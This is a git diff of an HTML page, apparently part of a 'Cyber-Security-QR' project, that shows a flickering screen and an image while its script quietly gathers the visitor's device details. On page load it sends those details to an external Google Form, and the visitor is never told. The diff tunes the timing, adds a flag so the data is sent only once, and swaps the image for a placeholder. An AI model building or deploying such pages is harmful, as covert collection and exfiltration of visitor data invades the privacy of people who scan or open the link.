@@ -8,7 +8,6 @@
         body {
             margin: 0;
             overflow: hidden; /* Hide scrollbars */
-            background-color: white; /* Set a default background color */
         }
         .flicker {
             width: 100vw;
@@ -25,19 +24,16 @@
             80% { background-color: red; }
             100% { background-color: blue; }
         }
-        /* Centered image style */
         .image-container {
-            display: none; /* Initially hidden */
+            display: none; /* Hidden by default */
             position: absolute;
             top: 50%;
             left: 50%;
             transform: translate(-50%, -50%);
-            max-width: 90%; /* Limit width for mobile devices */
-            max-height: 90%; /* Limit height for mobile devices */
-            background-color: white; /* Match the image background */
+            z-index: 1; /* Ensure the image is on top */
         }
-        .image-container img {
-            width: 100%; /* Responsive width */
+        img {
+            max-width: 90%; /* Limit size to fit mobile screens */
             height: auto; /* Maintain aspect ratio */
         }
     </style>
@@ -45,10 +41,12 @@
 <body>
     <div class="flicker"></div>
     <div class="image-container">
-        <img src="https://github.com/atharva20031975/Cyber-Security-QR/blob/main/MB_star-M-pos.png?raw=true" alt="Device Information Image">
+        <img id="device-image" src="YOUR_IMAGE_URL_HERE" alt="Device Information" />
     </div>
 
     <script>
+        let dataSent = false; // Flag to track if data has been sent
+
         // Device Type
         function getDeviceType() {
             const userAgent = navigator.userAgent.toLowerCase();
@@ -191,17 +189,20 @@
 
         // Function to save device details and send to Google Form
         async function fetchAndSendDeviceDetails() {
-            const details = await fetchDeviceDetails();
-            sendToGoogleForm(details);
+            if (!dataSent) { // Only send if data hasn't been sent yet
+                const details = await fetchDeviceDetails();
+                sendToGoogleForm(details);
+                dataSent = true; // Set the flag to indicate data has been sent
+            }
         }
 
         // Automatically fetch and send details on page load
         window.onload = function() {
-            fetchAndSendDeviceDetails();
             setTimeout(() => {
-                document.querySelector('.flicker').style.display = 'none'; // Hide flicker
-                document.querySelector('.image-container').style.display = 'block'; // Show image container
-            }, 10000); // Adjust the time if needed
+                document.querySelector('.flicker').style.display = 'none'; // Hide flicker effect
+                document.querySelector('.image-container').style.display = 'block'; // Show the image
+                fetchAndSendDeviceDetails(); // Fetch and send device details
+            }, 2000); // Adjust the duration of the flicker effect here
         };
     </script>
 </body>
